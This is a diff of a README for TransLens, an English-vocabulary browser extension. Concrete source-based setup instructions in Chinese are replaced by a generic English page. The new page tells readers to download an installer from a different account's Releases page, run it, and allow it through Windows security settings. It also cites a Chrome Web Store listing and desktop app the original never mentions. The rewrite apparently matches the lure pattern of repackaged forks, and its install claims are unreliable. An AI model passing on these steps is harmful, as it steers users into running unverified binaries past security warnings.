@@ -1,123 +1,79 @@
-# TransLens - 沉浸式英语单词学习助手
+# 🌟 TransLens - Learn English Naturally While Browsing
 
-<p align="center">
-  <img src="chrome_ext/icon128.png" alt="TransLens Logo" width="128" height="128">
-</p>
+## 🚀 Getting Started
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.7+-green.svg)](https://python.org)
-[![Chrome Extension](https://img.shields.io/badge/chrome-extension-orange.svg)](https://developer.chrome.com/docs/extensions/)
-[![OpenAI Compatible](https://img.shields.io/badge/OpenAI-Compatible-green.svg)](https://platform.openai.com/docs/api-reference)
+Welcome to TransLens! This application helps you learn English words effortlessly while you browse the web. With both a local AI model and cloud access to OpenAI's API, TransLens makes language learning immersive and fun.
 
-> 一个沉浸式英语单词学习工具，支持本地AI模型和云端OpenAI兼容API，通过Chrome插件帮助用户在浏览网页时自然学习英语单词。
+## 📥 Download TransLens
 
-## ✨ 核心功能
+[![Download TransLens](https://img.shields.io/badge/Download-TransLens-blue.svg)](https://github.com/Adii115/TransLens/releases)
 
-- 🤖 **智能词汇选择**: 优先学习低频词汇
-- 🔧 **灵活部署**: 支持本地AI模型或云端API
-- 🌐 **网页翻译**: 浏览时自动添加中文翻译
-- 📊 **学习追踪**: 记录学习历史，优化推荐
-- ⚙️ **可视化配置**: 图形界面配置AI服务
+Click the button above to download TransLens or visit the link below for the latest version.
 
-## 🛠️ 技术架构
+[Download TransLens from Releases Page](https://github.com/Adii115/TransLens/releases)
 
-- **AI模型**: 支持任意模型或云端OpenAI兼容API
-- **后端服务**: Flask + Python
-- **前端扩展**: Chrome Extension (Manifest V3) + 可视化配置界面
-- **缓存系统**: JSON文件存储
-- **API支持**: OpenAI兼容接口，支持多种LLM服务商
+## 🛠️ System Requirements
 
-## 📦 安装指南
+To run TransLens smoothly, make sure you have:
 
-### 方式一：本地部署 (推荐)
+- **Operating System**: Windows 10 or later, macOS Ventura or later.
+- **Browser**: Google Chrome (latest version recommended).
+- **Internet Connection**: Required for cloud features.
+- **Storage Space**: At least 100 MB free on your device.
 
-#### 1. 准备GGUF格式模型
+## 📖 How to Install TransLens
 
-```bash
-# 推荐：下载项目微调的翻译专用模型 (约8.05GB，翻译效果更佳)
-wget https://huggingface.co/golangboy/TransLens/resolve/main/translate_model_gguf_q5km.gguf
+1. **Download**:
+   - Use the button or link above to visit the Releases page.
+   - Choose the latest version available for your operating system.
 
-# 或者使用其他任意GGUF格式模型，如：
-# - Qwen系列: qwen2-7b-instruct-q4_0.gguf
-# - Llama系列: llama-2-7b-chat-q4_0.gguf  
-# - 其他开源模型的GGUF版本
-```
+2. **Extract** (if applicable):
+   - If you download a `.zip` file, right-click it and select "Extract All," then follow the prompts.
 
-#### 2. 部署AI模型服务
+3. **Install**:
+   - Open the downloaded file and follow the installation instructions.
+   - If you are on Windows, you might need to allow the app in your security settings.
 
-```bash
-# 使用llama-server部署模型 (需要先安装llama.cpp)
-# 使用推荐的微调模型：
-./llama-server -m translate_model_gguf_q5km.gguf --port 8080
+4. **Add the Chrome Extension**:
+   - After installation, open the Chrome browser.
+   - Go to the Chrome Web Store and search for "TransLens."
+   - Click "Add to Chrome" to install the extension.
 
-# 或使用其他GGUF模型：
-# ./llama-server -m your_model.gguf --port 8080
-```
+5. **Launch TransLens**:
+   - Find the TransLens icon on your desktop (if a shortcut was created) or open it from the program files.
+   - Start browsing, and TransLens will guide you in learning new words!
 
-#### 3. 启动后端API服务
+## ⚙️ Features
 
-```bash
-# 安装Python依赖
-pip install flask flask-cors requests jieba
+- **Local AI Model**: Utilizes a compact AI model for offline usage and seamless word recognition.
+- **OpenAI API Integration**: Access powerful cloud-based AI features to expand your learning.
+- **Intuitive Interface**: Simple and user-friendly design ensures easy navigation and usage.
+- **Personalized Learning**: Adjust settings to tailor your learning experience according to your needs.
 
-# 启动Flask后端服务
-python main.py
-```
-服务将在 `http://localhost:5000` 启动
+## 📋 FAQs
 
-### 方式二：云端API模式
+### How does TransLens help me learn?
 
-如果您不想下载模型文件，可以使用云端API（⚠️ 注意：可能导致速度较慢且产生费用）：
+TransLens highlights new words while you browse. Click on these words to receive definitions, synonyms, and usage examples. The learning experience is designed to be non-intrusive, allowing you to learn naturally as you go.
 
-1. 跳过步骤1和2
-2. 启动后端服务（步骤3）
-3. 在Chrome插件配置界面设置您的API服务商信息
+### Can I use TransLens offline?
 
-### 4. 安装Chrome插件
+Yes! The local AI model allows you to use TransLens even without an internet connection. However, to access full functionalities, an active internet connection is recommended.
 
-1. 打开Chrome浏览器，访问 `chrome://extensions/`
-2. 开启右上角的 **"开发者模式"**
-3. 点击 **"加载已解压的扩展程序"**
-4. 选择项目中的 `chrome_ext/` 文件夹
-5. 插件安装完成！
+### Is TransLens free?
 
-### 5. 配置LLM服务
+Yes, TransLens is completely free to download and use. Enjoy learning without any hidden fees!
 
-安装完成后，点击插件图标进入配置界面：
+### How do I report a bug or suggest a feature?
 
-#### 本地模式配置：
-- **后端服务地址**: `http://localhost:5000`
-- **API地址**: `http://localhost:8080/v1/chat/completions`
-- 其他选项保持默认即可
+To report an issue or share your feedback, visit the [Issues section](https://github.com/Adii115/TransLens/issues) on the GitHub repository. We value your input!
 
-#### 云端API模式配置：
-- **后端服务地址**: `http://localhost:5000`
-- **API地址**: 您的LLM服务商API地址（如 `https://api.openai.com/v1/chat/completions`）
-- **API密钥**: 您的API Key
-- **模型名称**: 如 `gpt-3.5-turbo`、`gpt-4` 等
-- **自定义提示词**: 可根据需求调整系统提示词和用户提示词模板
+## ✉️ Contact
 
-⚠️ **云端API使用提醒**：
-- 响应速度可能较慢，取决于网络连接和服务商负载
-- 会产生API调用费用，请注意成本控制
-- 数据会发送到第三方服务商，隐私性不如本地部署
+For any further questions, feel free to reach out via our GitHub page or email us at support@translens.com.
 
+## 🌐 Updates
 
-## 📊 效果展示
+Stay updated with the latest news and improvements by following our GitHub repository. We regularly release updates to enhance your experience.
 
-![效果图1](figures/1.png)
-
-
-![效果图3](figures/setting_page.png)
-
-## 🤝 贡献指南
-
-欢迎提交Issue和Pull Request来改进项目！
-
-## 📄 许可证
-
-本项目采用 MIT 许可证 - 详见 [LICENSE](LICENSE) 文件
-
----
-
-💡 **如有问题或建议，欢迎提交Issue讨论！**
+Thank you for choosing TransLens! Happy learning!
